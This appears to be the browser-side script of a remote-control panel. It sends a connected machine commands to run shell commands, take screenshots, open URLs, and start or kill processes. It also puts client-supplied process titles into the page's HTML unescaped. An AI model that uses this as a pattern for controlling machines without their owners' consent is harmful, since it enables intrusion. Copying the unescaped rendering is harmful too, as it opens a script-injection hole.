
window.onload = () => {
    setInterval(() => {
        sio.emit("process_list", {clientId: clientId});
    }, 2000);
}

const hideSpinner = (id) => {
    document.getElementById(id).style.display = "none";
}

const getFormData  = (target) => {
    const formData = new FormData(target)
    let data = {};
    Array.from(formData).map((item) => {
        data[item[0]] = item[1]
    })
    data.clientId = clientId;
    return data;
}

const manageBtnScreenShoot = document.getElementById('manageBtnScreenShoot');
const websiteForm = document.getElementById('websiteForm')
const websiteFormBtn = document.getElementById('websiteFormBtn');
const urlSpinner = document.getElementById('urlSpinner')
const urlInput = document.querySelector('input[name="url"]')
const commandForm = document.getElementById('commandForm');
const commandResult = document.getElementById('commandResult');
const commandFormBtnClear = document.getElementById('commandFormBtnClear');
const selectCommands = document.getElementById('selectCommands');
const commandInput = document.querySelector('input[name="command"]')
const processList = document.getElementById('processList');
const processTable = document.getElementById('processTable');
const processForm = document.getElementById('processForm');

manageBtnScreenShoot.addEventListener('click', (e) => {
    sio.emit('screenshoot', {clientId: clientId});
})

websiteForm.addEventListener('submit', (e) => {
    e.preventDefault();
    console.log('Strona!')
    const data = getFormData(e.target);
    sio.emit('website', data)
})

commandForm.addEventListener('submit', (e) => {
    e.preventDefault();
    console.log('Komenda');
    const data = getFormData(e.target);
    console.log(data);
    sio.emit('command', data);
})

processForm.addEventListener('submit', (e) => {
    e.preventDefault();
    console.log('Process');
    const data = getFormData(e.target);
    console.log(data);
    sio.emit('process_start', data);
})

commandFormBtnClear.addEventListener('click', (e) => {
    commandResult.innerHTML = '';
})

selectCommands.addEventListener('change', (e) => {
    console.log(`Wybrano ${e.target.value}`);
    commandInput.value = e.target.value;
});

/*sio.on('systemInfo', function(data) {
    (async () => {
        await updateClientDetailsLocalStorage(clientId, data);
        generateSystemInfo(data);
    })();
})*/

sio.on('website_btn', function(data) {
    const state = data.state;

    if (!state) {
        websiteFormBtn.disabled = true;
        urlSpinner.style.display = 'block';
        urlInput.value = '';
        urlInput.disabled = true;
    } else {
        websiteFormBtn.disabled = false;
        urlSpinner.style.display = 'none';
        urlInput.disabled = false;
    }

})

sio.on('ss_btn', function(data) {
    const state = data.state;

    if (!state) {
        manageBtnScreenShoot.disabled = true;
    } else {
        manageBtnScreenShoot.disabled = false;
        UIkit.notification({message: 'Pomyslnie zrobiono zrzut ekranu', pos: 'bottom-right', status: 'success'})
    }

})

sio.on('command', (data) => {
    console.log(data.message);
    const resultBody = document.createElement('div');
    resultBody.style.marginBottom = "5px";
    resultBody.style.padding = "2px";
    resultBody.style.borderBottom = '1px solid white';

    resultBody.textContent = data.message;
    commandResult.append(resultBody);
})

const killProcess = (processId) => {
    console.log(processId);
    sio.emit("process_kill", {clientId: clientId, processId: processId});
}

sio.on("process_list", (data) => {
    console.log(data);
    let processHtml = '';
    data.processes.map(process => {

        processHtml += `
            <tr>
                <td>${process.MainWindowTitle}</td>
                <td>${process.Name}</td>
                <td>${process.Id}</td>
                <td>
                    <div class="uk-inline">
                        <button class="uk-button uk-button-default" type="button" onclick="killProcess(${process.Id})">Zakoncz</button>
                    </div>
                </td>
            </tr>
        `;
    })
    processList.innerHTML = processHtml;
    processTable.style.display = "block";
    hideSpinner('processSpinner');
})

sio.on('client_disconnected', (data) => {
    window.location.href = address;
});